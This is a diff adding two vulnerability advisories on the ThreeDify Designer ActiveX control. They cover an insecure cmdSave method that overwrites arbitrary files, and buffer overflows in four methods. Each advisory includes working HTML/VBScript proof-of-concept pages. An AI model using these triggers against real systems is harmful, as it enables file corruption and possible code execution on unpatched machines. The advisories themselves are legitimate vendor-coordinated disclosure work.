@@ -1,0 +1,118 @@
+=========================================
+Vulnerability ID: HTB23021
+Reference: http://www.htbridge.ch/advisory/threedify_designer_activex_control_insecure_method.html
+Product: ThreeDify Designer
+Vendor: ThreeDify ( http://www.threedify.com ) 
+Vulnerable Version: 5.0.2 and probably prior
+Tested on: 5.0.2
+Vendor Notification: 07 June 2011 
+Vulnerability Type: Insecure Method
+Status: Fixed by Vendor
+Risk level: Medium 
+Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ ) 
+
+Vulnerability Details:
+High-Tech Bridge SA Security Research Lab has discovered a vulnerability in ThreeDify Designer ActiveX control, which can be exploited to overwrite arbitrary files.
+
+The vulnerability is caused due to the ThreeDify.ThreeDifyDesigner.1 (ActiveSolid.dll) ActiveX control including the insecure "cmdSave()" method. 
+This can be exploited to corrupt arbitrary files in the context of the currently logged-on user.
+
+The following PoC code is available:
+
+
+<html>
+<object classid='clsid:32B165C1-AD31-11D5-8889-0010A4C62D06' id='target' /></object>
+<input language=VBScript onclick=Boom() type=button value="Exploit">
+<script language = 'vbscript'>
+
+Sub Boom()
+arg1="FilePath\Filename_to_create_or_to_overwrite"
+target.cmdSave arg1 
+End Sub
+
+</script>
+</html>
+
+Solution: Upgrade to the most recent version
+
+
+=========================================
+Vulnerability ID: HTB23020
+Reference: http://www.htbridge.ch/advisory/threedify_designer_activex_control_multiple_buffer_overflow_vulnerabilities.html
+Product: ThreeDify Designer
+Vendor: ThreeDify ( http://www.threedify.com ) 
+Vulnerable Version: 5.0.2 and probably prior
+Tested on: 5.0.2
+Vendor Notification: 07 June 2011 
+Vulnerability Type: Buffer Overflow
+Status: Fixed by Vendor
+Risk level: High 
+Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ ) 
+
+Vulnerability Details:
+High-Tech Bridge SA Security Research Lab has discovered a multiple buffer overflow vulnerabilities in ThreeDify Designer ActiveX control.
+
+1) User-supplied data in "fileName" parameter is not properly bound-checked before being copied into an insufficiently sized buffer in "cmdExport()" method in ActiveSolid.dll file.
+Successful exploitation of the vulnerability allows remote attackers to execute arbitrary code in the context of the vulnerable application.
+The following PoC code is available:
+
+
+<html>
+<body>
+<object classid='clsid:32B165C1-AD31-11D5-8889-0010A4C62D06' id='target'></object>
+<script language='vbscript'>
+arg1=String(3000, "A")
+target.cmdExport arg1 
+</script>
+</body>
+</html>
+
+
+2) User-supplied data in "fileName" parameter is not properly bound-checked before being copied into an insufficiently sized buffer in "cmdImport()" method in ActiveSolid.dll file.
+Successful exploitation of the vulnerability allows remote attackers to execute arbitrary code in the context of the vulnerable application.
+The following PoC code is available:
+
+
+<html>
+<body>
+<object classid='clsid:32B165C1-AD31-11D5-8889-0010A4C62D06' id='target'></object>
+<script language='vbscript'>
+arg1=String(3000, "A")
+target.cmdImport arg1 
+</script>
+</body>
+</html>
+
+
+3) User-supplied data in "fileName" parameter is not properly bound-checked before being copied into an insufficiently sized buffer in "cmdOpen()" method in ActiveSolid.dll file.
+Successful exploitation of the vulnerability allows remote attackers to execute arbitrary code in the context of the vulnerable application.
+The following PoC code is available:
+
+
+<html>
+<body>
+<object classid='clsid:32B165C1-AD31-11D5-8889-0010A4C62D06' id='target'></object>
+<script language='vbscript'>
+arg1=String(3000, "A")
+target.cmdOpen arg1 
+</script>
+</body>
+</html>
+
+
+4) User-supplied data in "fileName" parameter is not properly bound-checked before being copied into an insufficiently sized buffer in "cmdSave()" method in ActiveSolid.dll file.
+Successful exploitation of the vulnerability allows remote attackers to execute arbitrary code in the context of the vulnerable application.
+The following PoC code is available:
+
+
+<html>
+<body>
+<object classid='clsid:32B165C1-AD31-11D5-8889-0010A4C62D06' id='target'></object>
+<script language='vbscript'>
+arg1=String(3000, "A")
+target.cmdSave arg1 
+</script>
+</body>
+</html>
+
+Solution: Upgrade to the most recent version
